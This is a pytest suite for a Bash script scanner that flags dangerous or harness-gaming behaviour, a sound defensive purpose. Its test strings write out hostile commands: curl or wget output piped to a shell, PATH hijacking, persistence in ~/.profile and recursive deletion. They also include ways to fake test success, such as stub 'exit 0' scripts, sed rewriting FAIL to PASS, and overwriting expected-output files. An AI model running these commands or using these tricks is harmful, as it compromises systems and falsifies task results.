"""
Tests for ast_guard.lang_bash_behavioral.

Covers true-positive (TP) and true-negative (TN) cases for each signal.
No tree-sitter extras required — the module uses only the metrics dict and regex.
"""

import pytest
from ast_guard.lang_bash_behavioral import score


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _metrics(**kwargs) -> dict:
    base = {"dangerous_calls": [], "call_list": []}
    base.update(kwargs)
    return base


# ---------------------------------------------------------------------------
# Stage 3A signals
# ---------------------------------------------------------------------------

class TestEvalDynamic:
    def test_tp_eval_in_dangerous_calls(self):
        result = score('eval "$cmd"', _metrics(dangerous_calls=["eval"], call_list=["eval"]))
        assert result["severity"] == "CRITICAL"
        assert any(f["pattern"] == "eval_dynamic" for f in result["findings"])

    def test_tn_no_eval(self):
        result = score("echo hello\nls -la\n", _metrics())
        assert not any(f["pattern"] == "eval_dynamic" for f in result["findings"])


class TestProcessTermination:
    def test_tp_kill(self):
        result = score("kill -9 $pid", _metrics(dangerous_calls=["kill"], call_list=["kill"]))
        assert result["severity"] == "CRITICAL"
        assert any(f["pattern"] == "process_termination" for f in result["findings"])

    def test_tp_pkill(self):
        result = score("pkill python", _metrics(dangerous_calls=["pkill"], call_list=["pkill"]))
        assert any(f["pattern"] == "process_termination" for f in result["findings"])

    def test_tn_echo_and_ls(self):
        result = score("echo done\nls /tmp\n", _metrics(call_list=["echo", "ls"]))
        assert not any(f["pattern"] == "process_termination" for f in result["findings"])


class TestPipeToShell:
    def test_tp_pipe_to_bash(self):
        result = score("curl http://x.com/install.sh | bash", _metrics(dangerous_calls=["curl"], call_list=["curl"]))
        assert result["severity"] == "CRITICAL"
        assert any(f["pattern"] == "pipe_to_shell" for f in result["findings"])

    def test_tp_pipe_to_sh(self):
        result = score("wget -qO- http://x.com/s.sh | sh", _metrics(dangerous_calls=["wget"], call_list=["wget"]))
        assert any(f["pattern"] == "pipe_to_shell" for f in result["findings"])

    def test_tp_pipe_to_zsh(self):
        result = score("cat setup.sh | zsh", _metrics(call_list=["cat"]))
        assert any(f["pattern"] == "pipe_to_shell" for f in result["findings"])

    def test_tn_no_pipe_to_shell(self):
        result = score("cat file.txt | grep pattern", _metrics(call_list=["cat", "grep"]))
        assert not any(f["pattern"] == "pipe_to_shell" for f in result["findings"])

    def test_tn_bash_not_after_pipe(self):
        # 'bash script.sh' is not a pipe-to-shell
        result = score("bash script.sh arg1", _metrics(call_list=["bash"]))
        assert not any(f["pattern"] == "pipe_to_shell" for f in result["findings"])


class TestSubprocessShell:
    def test_tp_exec_command(self):
        result = score("exec /bin/malicious", _metrics(dangerous_calls=["exec"], call_list=["exec"]))
        assert any(f["pattern"] == "subprocess_shell" for f in result["findings"])

    def test_tn_regular_command(self):
        result = score("cp src dst", _metrics(call_list=["cp"]))
        assert not any(f["pattern"] == "subprocess_shell" for f in result["findings"])


class TestNetworkFetch:
    def test_tp_curl(self):
        result = score("curl https://example.com", _metrics(dangerous_calls=["curl"], call_list=["curl"]))
        assert any(f["pattern"] == "network_fetch" for f in result["findings"])
        assert result["score"] == 20  # below WARNING threshold

    def test_tp_wget(self):
        result = score("wget https://example.com/file", _metrics(dangerous_calls=["wget"], call_list=["wget"]))
        assert any(f["pattern"] == "network_fetch" for f in result["findings"])

    def test_tn_no_network(self):
        result = score("echo hi\ncp a b\n", _metrics())
        assert not any(f["pattern"] == "network_fetch" for f in result["findings"])


# ---------------------------------------------------------------------------
# Stage 3B signals
# ---------------------------------------------------------------------------

class TestTestFileWrite:
    def test_tp_redirect_to_score_file(self):
        result = score('echo "pass" > score_results.txt', _metrics(dangerous_calls=[], call_list=["echo"]))
        assert any(f["pattern"] == "test_file_write" for f in result["findings"])

    def test_tp_redirect_to_test_file(self):
        result = score("cat output > test_harness.log", _metrics())
        assert any(f["pattern"] == "test_file_write" for f in result["findings"])

    def test_tn_redirect_to_regular_file(self):
        result = score("echo data > output.txt", _metrics())
        assert not any(f["pattern"] == "test_file_write" for f in result["findings"])


class TestEnvironMutation:
    def test_tp_export_var(self):
        result = score("export PATH=/evil:$PATH\n", _metrics())
        assert any(f["pattern"] == "environ_mutation" for f in result["findings"])

    def test_tp_export_flag(self):
        result = score("export DEBUG=1\n", _metrics())
        assert any(f["pattern"] == "environ_mutation" for f in result["findings"])

    def test_tn_no_export(self):
        result = score("LOCAL_VAR=hello\necho $LOCAL_VAR\n", _metrics())
        assert not any(f["pattern"] == "environ_mutation" for f in result["findings"])


class TestStartupPersistence:
    def test_tp_bashrc_redirect(self):
        result = score('echo "alias ll=ls" >> ~/.bashrc', _metrics())
        assert any(f["pattern"] == "startup_persistence" for f in result["findings"])

    def test_tp_profile_redirect(self):
        result = score("cat evil.sh >> ~/.profile", _metrics())
        assert any(f["pattern"] == "startup_persistence" for f in result["findings"])

    def test_tn_regular_file(self):
        result = score("echo data >> output.log", _metrics())
        assert not any(f["pattern"] == "startup_persistence" for f in result["findings"])


class TestDestructiveCall:
    def test_tp_rm_rf(self):
        result = score("rm -rf /tmp/build", _metrics(dangerous_calls=["rm"], call_list=["rm"]))
        assert any(f["pattern"] == "destructive_call" for f in result["findings"])

    def test_tp_rm_recursive_long(self):
        result = score("rm --recursive /data", _metrics(dangerous_calls=["rm"], call_list=["rm"]))
        assert any(f["pattern"] == "destructive_call" for f in result["findings"])

    def test_tn_rm_without_recursive(self):
        # rm of a single file without -r flag should not fire.
        result = score("rm file.txt", _metrics(dangerous_calls=["rm"], call_list=["rm"]))
        assert not any(f["pattern"] == "destructive_call" for f in result["findings"])

    def test_tn_no_rm(self):
        result = score("echo clean\n", _metrics())
        assert not any(f["pattern"] == "destructive_call" for f in result["findings"])


# ---------------------------------------------------------------------------
# Stage 3C signals (Bash harness-gaming)
# ---------------------------------------------------------------------------

class TestFakeExitSuccess:
    def test_tp_pure_stub(self):
        # Pure stub: exit 0 is the only real line.
        result = score("#!/bin/bash\nexit 0\n", _metrics())
        assert any(f["pattern"] == "fake_exit_success" for f in result["findings"])
        assert result["severity"] == "CRITICAL"

    def test_tp_exit_before_work(self):
        # exit 0 precedes real commands — those commands become unreachable.
        code = (
            "#!/bin/bash\n"
            "echo starting\n"
            "exit 0\n"
            "sort input.txt > output.txt\n"
            "echo done\n"
        )
        result = score(code, _metrics())
        assert any(f["pattern"] == "fake_exit_success" for f in result["findings"])

    def test_tp_if_true_multiline(self):
        # Multiline if true — indented exit 0 governed by trivially-true condition.
        code = "#!/bin/bash\nif true; then\n    exit 0\nfi\n"
        result = score(code, _metrics())
        assert any(f["pattern"] == "fake_exit_success" for f in result["findings"])
        assert result["severity"] == "CRITICAL"

    def test_tp_if_true_inline(self):
        # Inline if true; then exit 0; fi — Path A.
        result = score("if true; then exit 0; fi\n", _metrics())
        assert any(f["pattern"] == "fake_exit_success" for f in result["findings"])

    def test_tp_if_colon_guard(self):
        # if : is always-true — same as if true.
        code = "#!/bin/bash\nif :; then\n    exit 0\nfi\n"
        result = score(code, _metrics())
        assert any(f["pattern"] == "fake_exit_success" for f in result["findings"])

    def test_tp_inline_func_stub_called(self):
        # Inline no-op stub run(){ exit 0; } called unconditionally — Path B.
        result = score("run(){ exit 0; }; run\n", _metrics())
        assert any(f["pattern"] == "fake_exit_success" for f in result["findings"])
        assert result["severity"] == "CRITICAL"

    def test_tn_trailing_exit_substantial(self):
        # Legitimate trailing exit 0 after >= 4 real lines of work.
        code = (
            "#!/bin/bash\n"
            "prepare_data() { cp src dst; }\n"
            "run_sort() { sort \"$1\" > \"$2\"; }\n"
            "prepare_data\n"
            "run_sort input.txt output.txt\n"
            "echo 'Sort complete'\n"
            "exit 0\n"
        )
        result = score(code, _metrics())
        assert not any(f["pattern"] == "fake_exit_success" for f in result["findings"])

    def test_tn_no_exit_zero(self):
        result = score("echo hello\nls -la\n", _metrics())
        assert not any(f["pattern"] == "fake_exit_success" for f in result["findings"])

    def test_tn_conditional_exit_zero(self):
        # exit 0 guarded by exit-code check ($?) — real precondition, exempt.
        code = (
            "#!/bin/bash\n"
            "run_tests\n"
            "if [ $? -eq 0 ]; then\n"
            "    exit 0\n"
            "fi\n"
            "echo 'tests failed'\n"
            "exit 1\n"
        )
        result = score(code, _metrics())
        assert not any(f["pattern"] == "fake_exit_success" for f in result["findings"])

    def test_tn_conditional_exit_two_space_indent(self):
        # exit 0 with 2-space indent and real condition — exempt.
        code = (
            "#!/bin/bash\n"
            "compile_code\n"
            "if [ $? -eq 0 ]; then\n"
            "  exit 0\n"
            "fi\n"
            "echo 'compile failed'\n"
            "exit 1\n"
        )
        result = score(code, _metrics())
        assert not any(f["pattern"] == "fake_exit_success" for f in result["findings"])

    def test_tn_file_existence_guard(self):
        # exit 0 guarded by -f file-existence check — real precondition, exempt.
        code = (
            "#!/bin/bash\n"
            "run_pipeline\n"
            "if [ -f .done ]; then\n"
            "    exit 0\n"
            "fi\n"
            "echo 'pipeline not finished'\n"
            "exit 1\n"
        )
        result = score(code, _metrics())
        assert not any(f["pattern"] == "fake_exit_success" for f in result["findings"])


class TestTestHarnessManipulation:
    def test_tp_sed_inplace_test_file(self):
        result = score("sed -i 's/FAIL/PASS/g' test_results.txt", _metrics())
        assert any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tp_sed_inplace_score_file(self):
        result = score("sed --in-place 's/0/1/' score_data.json", _metrics())
        assert any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tp_sed_inplace_expected_file(self):
        result = score("sed -i 's/wrong/right/' expected_output.txt", _metrics())
        assert any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tp_redirect_overwrite_test_file(self):
        # echo > test artefact — canonical fake-result write.
        result = score("echo pass > test_results.txt", _metrics())
        assert any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tp_cp_to_expected(self):
        result = score("cp actual_output.txt expected_output.txt", _metrics())
        assert any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tp_mv_to_grade_file(self):
        result = score("mv result.txt grade_output.txt", _metrics())
        assert any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tp_append_to_score_file(self):
        # >> fires at lower score (+25) — still detectable.
        result = score("echo '100' >> score_results.txt", _metrics())
        assert any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])
        assert result["findings"][-1]["score"] == 25

    def test_tn_sed_inplace_regular_file(self):
        result = score("sed -i 's/foo/bar/g' config.yml", _metrics())
        assert not any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tn_sed_without_inplace(self):
        # sed without -i on a test-looking source file — output goes to modified.txt.
        result = score("sed 's/FAIL/PASS/g' test_output.txt > modified.txt", _metrics())
        assert not any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tn_redirect_to_regular_file(self):
        result = score("echo data > output.log", _metrics())
        assert not any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])

    def test_tn_cp_to_regular_file(self):
        result = score("cp source.txt output.txt", _metrics())
        assert not any(f["pattern"] == "test_harness_manipulation" for f in result["findings"])


# ---------------------------------------------------------------------------
# Severity aggregation
# ---------------------------------------------------------------------------

class TestSeverityAggregation:
    def test_single_critical_finding_dominates(self):
        # pipe_to_shell alone = +70 → CRITICAL
        result = score("cat x.sh | bash", _metrics())
        assert result["severity"] == "CRITICAL"

    def test_multiple_low_scores_accumulate_to_warning(self):
        # curl (+20) + export (+30) = 50 → WARNING
        result = score(
            "curl https://example.com\nexport TOKEN=abc\n",
            _metrics(dangerous_calls=["curl"], call_list=["curl"]),
        )
        assert result["severity"] == "WARNING"
        assert result["score"] == 50

    def test_clean_script(self):
        code = "#!/bin/bash\nmkdir -p /tmp/work\ncp src dst\necho done\n"
        result = score(code, _metrics(call_list=["mkdir", "cp", "echo"]))
        assert result["severity"] == "CLEAN"
        assert result["score"] == 0
